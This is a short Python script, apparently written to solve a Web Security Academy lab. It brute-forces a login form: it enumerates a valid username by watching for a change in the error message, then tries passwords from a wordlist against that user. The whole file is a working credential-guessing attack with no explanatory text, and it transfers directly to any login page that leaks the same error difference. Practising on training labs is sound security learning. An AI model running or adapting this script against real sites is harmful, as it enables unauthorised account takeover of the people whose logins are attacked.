import requests

url = "https://0acc000403b8d39f8091620300860042.web-security-academy.net/login"

# Brute-force username
with open("usernames.txt", "r") as f:
    for line in f:
        username = line.strip()
        r = requests.post(url, data={"username": username, "password": "wrong_password"})
        if "Invalid username or password." not in r.text:
            break
print(username)

# Brute-force password
with open("passwords.txt", "r") as f:
    for line in f:
        password = line.strip()
        r = requests.post(url, data={"username": username, "password": password})
        if "Invalid username or password" not in r.text:
            break
print(password)